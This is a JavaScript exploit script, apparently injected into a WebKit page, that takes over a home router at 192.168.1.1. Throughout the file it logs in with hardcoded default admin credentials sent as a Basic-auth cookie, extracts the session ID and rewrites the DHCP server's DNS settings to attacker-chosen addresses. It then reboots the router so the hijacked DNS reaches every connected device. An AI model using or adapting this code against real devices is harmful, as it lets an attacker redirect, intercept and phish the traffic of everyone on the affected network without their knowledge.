// Function to get the session ID

const baseURL = "http://192.168.1.1"
document.cookie = "Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D";

async function getSessionId() {
    webkit.messageHandlers.exploit.postMessage("Logging in.");
    
    const url = baseURL + "/userRpm/LoginRpm.htm?Save=Save";
    const headers = {
        // "Cookie": "Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D",
        // "Authorization": "Basic YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D",
        "Referer": baseURL+"/",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"
    };
    
    webkit.messageHandlers.debug.postMessage(`Connecting to ${url}`);
    try {
        const response = await fetch(url, { method: "GET", headers });
        
        if (!response.ok) {
            webkit.messageHandlers.debug.postMessage(`Request failed: ${response.status}`);
            return null;
        }

        const responseBody = await response.text();
        webkit.messageHandlers.debug.postMessage(`Response Body: ${responseBody}`);
        
        // Log all response headers
        webkit.messageHandlers.debug.postMessage("Response Headers:");
        for (const [key, value] of response.headers.entries()) {
            webkit.messageHandlers.debug.postMessage(`${key}: ${value}`);
        }

        const sessionIdRegex = /window\.parent\.location\.href = \"http:\/\/192\.168\.1\.1\/([^\/]+)\/userRpm\/Index\.htm/;
        const match = responseBody.match(sessionIdRegex);

        if (match) {
            return match[1];
        } else {
            webkit.messageHandlers.debug.postMessage("Session ID not found in the response.");
            return null;
        }
    } catch (error) {
        webkit.messageHandlers.debug.postMessage("An error occurred:", error.message);
        return null;
    }
}

// Function to change the DNS
async function changeDNS(dns1, dns2, sessionId) {
    webkit.messageHandlers.debug.postMessage("Changing DNS.");
    const url = new URL(baseURL + `/${sessionId}/userRpm/LanDhcpServerRpm.htm`);
    url.searchParams.append("dhcpserver", "1");
    url.searchParams.append("ip1", "192.168.1.100");
    url.searchParams.append("ip2", "192.168.1.199");
    url.searchParams.append("Lease", "120");
    url.searchParams.append("gateway", "192.168.1.1");
    url.searchParams.append("domain", "");
    url.searchParams.append("dnsserver", dns1);
    url.searchParams.append("dnsserver2", dns2);
    url.searchParams.append("Save", "Save");

    const headers = {
        "Referer": baseURL + `/${sessionId}/userRpm/LanDhcpServerRpm.htm`,
    };

    try {
        const response = await fetch(url.toString(), { method: "GET", headers });

        if (!response.ok) {
            webkit.messageHandlers.debug.postMessage(`Request failed: ${response.status}`);
        } else {
            const responseBody = await response.text();
            webkit.messageHandlers.debug.postMessage(`Response Body ${responseBody}`);
        }
    } catch (error) {
        webkit.messageHandlers.debug.postMessage("An error occurred:", error.message);
    }
}

// Function to reboot the router
async function rebootRouter(sessionId) {
    document.cookie = "Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D";
    
    webkit.messageHandlers.debug.postMessage("Rebooting router.");
    const url = new URL(baseURL + `/${sessionId}/userRpm/SysRebootRpm.htm`);
    url.searchParams.append("Reboot", "Reboot");

    const headers = {
        "Referer": baseURL + `/${sessionId}/userRpm/SysRebootRpm.htm`,
        "Cookie": "Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D",
    };

    try {
        const response = await fetch(url, { method: "GET", headers });
        
        const responseBody = await response.text();
        webkit.messageHandlers.debug.postMessage(`Response Body: ${responseBody}`);
        
        if (responseBody.includes("Restarting")) {
            // Successfully restarting
            return true
        }else {
            if (!response.ok) {
                webkit.messageHandlers.debug.postMessage(`Request failed: ${response.status}`);
            } else {
                const responseBody = await response.text();
                webkit.messageHandlers.debug.postMessage(`Response Body: ${responseBody}`);
            }
            return false
        }
    } catch (error) {
        webkit.messageHandlers.debug.postMessage("An error occurred:", error.message);
    }
    return false
}

webkit.messageHandlers.exploit.postMessage("JS injected.");

(async () => {
    webkit.messageHandlers.exploit.postMessage("Starting exploit.");
    const sessionId = await getSessionId();
    if (sessionId) {
        webkit.messageHandlers.debug.postMessage("Session ID:", sessionId);
        await changeDNS("111.111.111.111", "222.222.222.222", sessionId);
//        webkit.messageHandlers.exploit.postMessage({"openURL": baseURL + `/${sessionId}/userRpm/LanDhcpServerRpm.htm`})
        webkit.messageHandlers.exploit.postMessage("DNS changed. Awaiting reboot.");
        webkit.messageHandlers.exploit.postMessage("Rebooting now.");
        var restarting = await rebootRouter(sessionId);
        if (!restarting) {
            restarting = await rebootRouter(sessionId);
        }
        
        if (restarting) {
            webkit.messageHandlers.exploit.postMessage("Done.");
        }else {
            webkit.messageHandlers.exploit.postMessage("Reboot failed.");
        }
        
//        let url = new URL(baseURL + `/${sessionId}/userRpm/Index.htm`)
//        webkit.messageHandlers.debug.postMessage(`Opening ${url}`);
//        // Open url in same tab to avoid CORS issues
//        window.open(url, "_self");
//        await sleep(2000); // Wait for 2 seconds
//        // Open the DNS settings page
//        document.getElementById("a14").click()
//        // await rebootRouter(sessionId);
//        webkit.messageHandlers.exploit.postMessage("Done");
        
    }
})();


